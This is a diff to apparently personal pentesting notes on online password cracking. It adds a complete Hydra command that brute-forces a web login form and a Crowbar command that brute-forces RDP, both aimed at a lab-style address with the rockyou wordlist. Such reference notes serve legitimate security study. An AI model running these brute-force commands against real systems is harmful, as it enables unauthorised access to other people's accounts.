@@ -27,10 +27,13 @@ ftp, ssh, http-post, http-get
     
 http-post
 
-    intercept request in burp - see body. No response - :S=302
-### Crowbar 
-rdp  
+    intercept request in burp - see body. No response - :S=302    
+    hydra 10.10.10.10 http-form-post "/index.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+    
+### RDP with Crowbar 
 
+    crowbar -b rdp -s 10.10.10.10 -u admin -C rockyou.txt -n 1
+    
 ### Misc Service Crackers  
 wpscan: crack wordpress logins 
 [pwn Jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins): crack Jenkins service  
